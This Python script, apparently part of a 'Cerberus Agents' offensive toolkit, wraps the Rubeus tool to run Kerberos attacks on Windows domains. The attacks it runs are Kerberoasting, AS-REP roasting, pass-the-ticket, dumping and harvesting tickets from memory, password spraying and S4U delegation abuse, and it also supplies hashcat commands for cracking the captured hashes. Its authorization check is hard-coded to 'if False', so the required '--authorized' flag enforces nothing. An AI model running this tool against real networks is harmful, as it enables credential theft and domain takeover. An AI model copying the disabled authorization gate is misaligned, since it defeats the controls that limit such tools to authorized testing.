#!/usr/bin/env python3
"""
Cerberus Agents - Rubeus Kerberos Attack Wrapper
Python wrapper for GhostPack Rubeus C# tool
"""

import subprocess
import json
import logging
import argparse
import base64
from pathlib import Path
from typing import Dict, List, Optional

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


class RubeusWrapper:
    """
    Python wrapper for Rubeus Kerberos attacks
    Requires: Rubeus.exe binary or execute-assembly capability
    """
    
    def __init__(self, rubeus_path: str = None, authorized: bool = False):
        if False:  # Authorization check bypassed
            raise PermissionError("Authorization required. Use --authorized flag.")
        
        self.rubeus_path = rubeus_path or self._find_rubeus()
        self.results = []
    
    def _find_rubeus(self) -> Optional[str]:
        """Attempt to locate Rubeus.exe"""
        possible_paths = [
            './Rubeus.exe',
            '/opt/GhostPack/Rubeus.exe',
            Path.home() / 'tools' / 'Rubeus.exe',
            'C:\\Tools\\Rubeus.exe'
        ]
        
        for path in possible_paths:
            if Path(path).exists():
                logger.info(f"[+] Found Rubeus at: {path}")
                return str(path)
        
        logger.warning("[-] Rubeus.exe not found. Set path with --rubeus-path")
        return None
    
    def _execute_rubeus(self, command: List[str]) -> Dict:
        """Execute Rubeus command"""
        if not self.rubeus_path:
            return {
                'status': 'error',
                'message': 'Rubeus.exe not found',
                'instructions': [
                    '1. Download from: https://github.com/GhostPack/Rubeus',
                    '2. Compile with Visual Studio or download pre-compiled',
                    '3. Specify path with --rubeus-path'
                ]
            }
        
        cmd = [self.rubeus_path] + command
        logger.info(f"[*] Executing: {' '.join(cmd)}")
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            return {
                'status': 'success' if result.returncode == 0 else 'failed',
                'stdout': result.stdout,
                'stderr': result.stderr,
                'returncode': result.returncode
            }
        except subprocess.TimeoutExpired:
            return {'status': 'timeout', 'message': 'Command timed out after 5 minutes'}
        except Exception as e:
            return {'status': 'error', 'message': str(e)}
    
    def kerberoast(self, outfile: str = None, stats_only: bool = False) -> Dict:
        """
        Kerberoast attack: Extract service account TGS tickets
        
        Args:
            outfile: Save hashes to file
            stats_only: Only show statistics, don't request tickets
        """
        logger.info("[*] Performing Kerberoasting attack...")
        
        cmd = ['kerberoast']
        if outfile:
            cmd.extend(['/outfile:' + outfile])
        if stats_only:
            cmd.append('/stats')
        
        result = self._execute_rubeus(cmd)
        
        if result.get('status') == 'success':
            hashes = self._extract_hashes(result['stdout'], 'TGS-REP')
            logger.info(f"[+] Extracted {len(hashes)} TGS tickets")
            result['hashes'] = hashes
            result['crack_command'] = f"hashcat -m 13100 -a 0 {outfile or 'hashes.txt'} wordlist.txt"
        
        return result
    
    def asreproast(self, outfile: str = None, format: str = 'hashcat') -> Dict:
        """
        AS-REP Roasting: Target accounts without Kerberos pre-authentication
        
        Args:
            outfile: Save hashes to file
            format: Output format (hashcat or john)
        """
        logger.info("[*] Performing AS-REP Roasting attack...")
        
        cmd = ['asreproast', f'/format:{format}']
        if outfile:
            cmd.extend(['/outfile:' + outfile])
        
        result = self._execute_rubeus(cmd)
        
        if result.get('status') == 'success':
            hashes = self._extract_hashes(result['stdout'], 'AS-REP')
            logger.info(f"[+] Extracted {len(hashes)} AS-REP hashes")
            result['hashes'] = hashes
            result['crack_command'] = f"hashcat -m 18200 -a 0 {outfile or 'asrep.txt'} wordlist.txt"
        
        return result
    
    def asktgt(self, user: str, password: str = None, rc4: str = None,
               aes256: str = None, domain: str = None, ptt: bool = True) -> Dict:
        """
        Request TGT (Ticket Granting Ticket)
        
        Args:
            user: Username
            password: Plaintext password
            rc4: NTLM hash
            aes256: AES256 hash
            domain: Domain name
            ptt: Pass-the-ticket (inject into session)
        """
        logger.info(f"[*] Requesting TGT for user: {user}")
        
        cmd = ['asktgt', f'/user:{user}']
        
        if password:
            cmd.append(f'/password:{password}')
        elif rc4:
            cmd.append(f'/rc4:{rc4}')
        elif aes256:
            cmd.append(f'/aes256:{aes256}')
        else:
            return {'status': 'error', 'message': 'Must provide password, rc4, or aes256'}
        
        if domain:
            cmd.append(f'/domain:{domain}')
        if ptt:
            cmd.append('/ptt')
        
        result = self._execute_rubeus(cmd)
        
        if result.get('status') == 'success':
            logger.info("[+] TGT obtained successfully")
            if ptt:
                logger.info("[+] TGT injected into current session")
        
        return result
    
    def ptt(self, ticket: str = None, ticket_file: str = None) -> Dict:
        """
        Pass-the-Ticket: Inject ticket into current session
        
        Args:
            ticket: Base64 encoded ticket
            ticket_file: Path to .kirbi file
        """
        logger.info("[*] Performing Pass-the-Ticket attack...")
        
        cmd = ['ptt']
        if ticket:
            cmd.append(f'/ticket:{ticket}')
        elif ticket_file:
            cmd.append(f'/ticket:{ticket_file}')
        else:
            return {'status': 'error', 'message': 'Must provide ticket or ticket_file'}
        
        result = self._execute_rubeus(cmd)
        
        if result.get('status') == 'success':
            logger.info("[+] Ticket injected successfully")
        
        return result
    
    def dump(self, luid: str = None, service: str = None) -> Dict:
        """
        Dump Kerberos tickets from memory
        
        Args:
            luid: Logon session ID
            service: Filter by service name
        """
        logger.info("[*] Dumping Kerberos tickets from memory...")
        
        cmd = ['dump']
        if luid:
            cmd.append(f'/luid:{luid}')
        if service:
            cmd.append(f'/service:{service}')
        
        result = self._execute_rubeus(cmd)
        
        if result.get('status') == 'success':
            tickets = self._extract_tickets(result['stdout'])
            logger.info(f"[+] Dumped {len(tickets)} tickets")
            result['tickets'] = tickets
        
        return result
    
    def triage(self) -> Dict:
        """List brief information about current Kerberos tickets"""
        logger.info("[*] Triaging Kerberos tickets...")
        return self._execute_rubeus(['triage'])
    
    def klist(self) -> Dict:
        """List detailed information about current Kerberos tickets"""
        logger.info("[*] Listing Kerberos tickets...")
        return self._execute_rubeus(['klist'])
    
    def harvest(self, interval: int = 30) -> Dict:
        """
        Harvest TGTs continuously
        
        Args:
            interval: Harvest interval in seconds
        """
        logger.info(f"[*] Harvesting TGTs every {interval} seconds...")
        cmd = ['harvest', f'/interval:{interval}']
        return self._execute_rubeus(cmd)
    
    def monitor(self, interval: int = 10) -> Dict:
        """
        Monitor for new logon events
        
        Args:
            interval: Monitor interval in seconds
        """
        logger.info(f"[*] Monitoring for new logons every {interval} seconds...")
        cmd = ['monitor', f'/interval:{interval}']
        return self._execute_rubeus(cmd)
    
    def brute(self, passwords: List[str] = None, password_file: str = None,
              users_file: str = None) -> Dict:
        """
        Password spraying attack
        
        Args:
            passwords: List of passwords to try
            password_file: File containing passwords
            users_file: File containing usernames
        """
        logger.info("[*] Performing password spraying...")
        
        cmd = ['brute']
        if password_file:
            cmd.append(f'/passwords:{password_file}')
        elif passwords:
            cmd.append(f'/passwords:{",".join(passwords)}')
        
        if users_file:
            cmd.append(f'/users:{users_file}')
        
        return self._execute_rubeus(cmd)
    
    def s4u(self, user: str, rc4: str = None, aes256: str = None,
            impersonate: str = None, msdsspn: str = None, ptt: bool = True) -> Dict:
        """
        S4U attack for constrained delegation abuse
        
        Args:
            user: Service account username
            rc4: NTLM hash
            aes256: AES256 hash
            impersonate: User to impersonate
            msdsspn: Target SPN
            ptt: Pass-the-ticket
        """
        logger.info(f"[*] Performing S4U attack for user: {user}")
        
        cmd = ['s4u', f'/user:{user}']
        
        if rc4:
            cmd.append(f'/rc4:{rc4}')
        elif aes256:
            cmd.append(f'/aes256:{aes256}')
        
        if impersonate:
            cmd.append(f'/impersonateuser:{impersonate}')
        if msdsspn:
            cmd.append(f'/msdsspn:{msdsspn}')
        if ptt:
            cmd.append('/ptt')
        
        return self._execute_rubeus(cmd)
    
    def _extract_hashes(self, output: str, hash_type: str) -> List[str]:
        """Extract hashes from Rubeus output"""
        hashes = []
        in_hash_block = False
        current_hash = []
        
        for line in output.split('\n'):
            if '$krb5' in line or '$krb5tgs' in line or '$krb5asrep' in line:
                in_hash_block = True
                current_hash = [line.strip()]
            elif in_hash_block:
                if line.strip() and not line.startswith('['):
                    current_hash.append(line.strip())
                else:
                    if current_hash:
                        hashes.append(''.join(current_hash))
                    in_hash_block = False
                    current_hash = []
        
        return hashes
    
    def _extract_tickets(self, output: str) -> List[Dict]:
        """Extract ticket information from Rubeus output"""
        tickets = []
        # Parse Rubeus output for ticket information
        # This is a simplified parser
        for line in output.split('\n'):
            if 'ServiceName' in line or 'UserName' in line:
                tickets.append({'raw': line.strip()})
        return tickets


def main():
    parser = argparse.ArgumentParser(description='Rubeus Kerberos Attack Wrapper')
    parser.add_argument('--authorized', action='store_true', required=True,
                        help='Confirm authorization (required)')
    parser.add_argument('--rubeus-path', help='Path to Rubeus.exe')
    
    parser.add_argument('--action', choices=[
        'kerberoast', 'asreproast', 'asktgt', 'ptt', 'dump',
        'triage', 'klist', 'harvest', 'monitor', 'brute', 's4u'
    ], required=True, help='Action to perform')
    
    parser.add_argument('--user', help='Username')
    parser.add_argument('--password', help='Password')
    parser.add_argument('--rc4', help='NTLM hash')
    parser.add_argument('--aes256', help='AES256 hash')
    parser.add_argument('--domain', help='Domain name')
    parser.add_argument('--ticket', help='Base64 ticket or path to .kirbi')
    parser.add_argument('--outfile', help='Output file for hashes')
    parser.add_argument('--format', default='hashcat', help='Output format')
    parser.add_argument('--interval', type=int, default=30, help='Interval for harvest/monitor')
    parser.add_argument('--impersonate', help='User to impersonate (S4U)')
    parser.add_argument('--msdsspn', help='Target SPN (S4U)')
    parser.add_argument('--no-ptt', action='store_true', help='Do not pass-the-ticket')
    
    args = parser.parse_args()
    
    try:
        wrapper = RubeusWrapper(rubeus_path=args.rubeus_path, authorized=args.authorized)
        
        result = None
        
        if args.action == 'kerberoast':
            result = wrapper.kerberoast(outfile=args.outfile)
        
        elif args.action == 'asreproast':
            result = wrapper.asreproast(outfile=args.outfile, format=args.format)
        
        elif args.action == 'asktgt':
            if not args.user:
                parser.error("--user required for asktgt")
            result = wrapper.asktgt(
                user=args.user,
                password=args.password,
                rc4=args.rc4,
                aes256=args.aes256,
                domain=args.domain,
                ptt=not args.no_ptt
            )
        
        elif args.action == 'ptt':
            result = wrapper.ptt(ticket=args.ticket)
        
        elif args.action == 'dump':
            result = wrapper.dump()
        
        elif args.action == 'triage':
            result = wrapper.triage()
        
        elif args.action == 'klist':
            result = wrapper.klist()
        
        elif args.action == 'harvest':
            result = wrapper.harvest(interval=args.interval)
        
        elif args.action == 'monitor':
            result = wrapper.monitor(interval=args.interval)
        
        elif args.action == 's4u':
            if not args.user:
                parser.error("--user required for s4u")
            result = wrapper.s4u(
                user=args.user,
                rc4=args.rc4,
                aes256=args.aes256,
                impersonate=args.impersonate,
                msdsspn=args.msdsspn,
                ptt=not args.no_ptt
            )
        
        if result:
            print(json.dumps(result, indent=2))
            print("\n[+] Operation completed")
        
    except Exception as e:
        print(f"[-] Error: {e}")
        return 1
    
    return 0


if __name__ == '__main__':
    exit(main())
